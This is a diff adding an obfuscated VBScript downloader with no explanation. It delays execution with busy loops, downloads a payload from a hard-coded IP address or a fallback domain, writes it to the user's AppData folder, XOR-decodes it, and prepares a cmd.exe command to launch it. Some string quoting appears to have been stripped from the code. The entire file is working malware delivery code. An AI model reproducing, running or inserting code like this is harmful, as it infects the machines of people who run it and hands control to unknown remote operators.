@@ -1,0 +1,121 @@
+DiM L4
+
+O8kuK
+
+suB O8kuK()
+	Xx=92752151
+	fOR GYM=1 To Xx
+		Kigiwk=Kigiwk+1
+	nExT
+	iF Kigiwk=Xx theN
+		WTh8P((4))
+		LJvUVZS(http://185.189.14.193/odg.jd)
+	ENd iF
+	
+eNd SuB
+
+sUb WTh8P(NIcXYuS)
+	dIM Xr8l
+	Xr8l=TimER+NIcXYuS
+	dO wHiLE timER<Xr8l
+		LOOp
+EnD sUB
+
+FuncTION LJvUVZS(DSUBiXAd)
+	Dim W25DiXD8,JENQjiW,CM
+	WFgObe="XY8w2"
+	On ERrOR REsuMe nExT
+	QWaUUe7="Nl82F3no"
+	SeT W25DiXD8=QN7(WScript.Shell)
+	StC5="UCB0e"
+	LWj
+	Set AP1w=W25DiXD8.EnVirONMeNT(PROCESS)
+	L4=AP1w(APPDATA)&SRToxoH((92))& QxRB & QxRB
+	FRbgi2C="Sl23"
+	Set JENQjiW=QN7(Microsoft.XMLHTTP)
+	JENQjiW.oPeN GET,DSUBiXAd,0
+	JENQjiW.SeND
+	if JENQjiW.StAtUs=(200) then
+		LWj
+		WTh8P((800))
+		CM = 9198
+	Else
+	JENQjiW.opEn GET,http://indigopoolandoutdoor.com/log.pkp,0
+	JENQjiW.SEnd
+	If JENQjiW.sTaTuS=(200)TheN 
+		CM = 9198
+	end if
+	If CM = 9198 THen
+		I0w JENQjiW.reSPOnsEBoDY
+	eNd If
+eNd FunCTIon
+
+fUnctiOn QN7(XKdOd2JA)
+	sET QN7=CreaTeoBjeCT(XKdOd2JA)
+EnD FUnCTIOn
+
+SuB LWj()
+	Dim Cq2m4Mu,RRxQ
+	For Cq2m4Mu = 41 To 8000162
+		RRxQ = TDZzgVL + 209
+	Next
+eND sUB
+
+FUNction SRToxoH(G2OS)
+	SRToxoH=cHR(G2OS)
+ENd funCtION
+
+FuNCtIOn QxRB()
+	QxRB=secoND(tIMe)
+enD funCTioN
+
+sUb I0w(TT)
+	DiM M3x3Bki
+	SxyGLQ="U0Tg9"
+	sEt M3x3Bki=QN7(ADODB.Stream)
+	M3x3Bki.OPen
+	M3x3Bki.TYpe=1
+	M3x3Bki.WRite TT
+	M3x3Bki.SavETOfILE L4 & .RqC,2
+	M3x3Bki.Close
+	Iw8Z
+eND suB
+
+SuB Iw8Z()
+	A7B=""""
+	V3x472a=L4 & QxRB & .CCM
+	DsqfW=cmd.exe /C START "" "
+	Lhctq L4 & .RqC,V3x472a
+	iF Udnt="" Then WTh8P((800))
+eND suB
+
+FuncTIoN Lhctq(UEH,LVtaMA)
+	dIM XY9qOIh,Vr,RDwheF,O5mb9P3N(5)
+	O5mb9P3N(3)=99
+	O5mb9P3N(0)=115
+	O5mb9P3N(1)=110
+	O5mb9P3N(2)=118
+	O5mb9P3N(4)=56
+	O5mb9P3N(5)=53
+	Set XY9qOIh=QN7(Scripting.FileSystemObject)
+	seT RDwheF=QN7(Scripting.FileSystemObject).opENTextFIle(UEH,1,0)
+	Set Vr=QN7(Scripting.FileSystemObject).cREATEtexTfilE(LVtaMA,1,0)
+	oN eRROR rEsuME nEXt
+	dO
+	XfQP2=QN7(Scripting.FileSystemObject).opENTextFIle(UEH,1,0).rEAd(1)
+	if ERr.nuMber = 0 then
+		Vr.wrItE SRToxoH(JfHfmozH(UG0z4b(QN7(Scripting.FileSystemObject).opENTextFIle(UEH,1,0).rEAd(1)),O5mb9P3N(0)))
+	eND iF
+	LoOp UNTIl Err.NUmBEr <> 0
+	Vr.CLoSE
+	QN7(Scripting.FileSystemObject).opENTextFIle(UEH,1,0).ClOsE
+EnD FUNcTIoN
+
+FunCTiON JfHfmozH(FboQ,YkAUE)
+	JfHfmozH=(FboQ aND nOt YkAUE)oR(NoT FboQ ANd YkAUE)
+eNd Function
+
+FUnCTiOn UG0z4b(QiYaL)
+	UG0z4b=aSC(QiYaL)
+EnD fUNCtion
+
